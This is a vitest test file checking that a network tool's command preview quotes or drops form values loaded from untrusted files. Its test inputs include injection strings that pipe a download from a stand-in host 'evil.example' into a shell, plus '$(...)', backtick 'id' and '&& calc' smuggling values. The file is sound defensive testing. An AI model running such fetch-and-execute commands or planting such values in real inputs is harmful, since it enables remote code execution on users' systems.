import { describe, expect, it } from 'vitest';

import { buildCommand } from './presentation';
import { createTab } from './registry';

// The command is shown in the strip, copied with its button and Ctrl+Shift+C,
// and recorded in History. Every value in it comes from the form, and opening a
// result bundle fills the form with whatever the file says. A host of
// `1.1.1.1 && calc` used to be one click from the clipboard as a working
// command.
describe('buildCommand with values from an untrusted form', () => {
  it('keeps a value with shell syntax in it to a single quoted argument', () => {
    const scan = createTab('scan');
    scan.form.host = '1.1.1.1; curl https://evil.example | sh';
    expect(buildCommand(scan)).toBe('netscli scan "1.1.1.1; curl https://evil.example | sh" -p 22,80,443 --json');

    const ping = createTab('ping');
    ping.form.host = 'router.local';
    ping.form.count = '4 && calc';
    expect(buildCommand(ping)).toBe('netscli ping router.local --count "4 && calc" --json');
  });

  it('leaves out a value that no quoting makes safe', () => {
    const scan = createTab('scan');
    scan.form.host = '$(curl https://evil.example | sh)';
    scan.form.ports = '80`id`';
    expect(buildCommand(scan)).toBe('netscli scan <host> --json');

    // A double quote ends the string in every shell, so it cannot be escaped
    // for all of them. The value is dropped, as an empty one is.
    const pcap = createTab('pcap');
    pcap.form.interface = 'eth0';
    pcap.form.filter = 'host "example"';
    expect(buildCommand(pcap)).toBe('netscli pcap --interface eth0 --duration 10 --max-packets 1000 --json');
  });

  it('quotes a name with spaces so the preview stays paste-able', () => {
    const pcap = createTab('pcap');
    pcap.form.interface = 'vEthernet (WSL)';
    expect(buildCommand(pcap)).toContain('--interface "vEthernet (WSL)"');
  });

  it('covers the mDNS service types, which are a list in one field', () => {
    const mdns = createTab('mdns');
    mdns.form.service_types = '_http._tcp, _ssh._tcp.local; calc';
    expect(buildCommand(mdns)).toBe(
      'netscli mdns --type _http._tcp --type "_ssh._tcp.local; calc" --json',
    );
  });
});
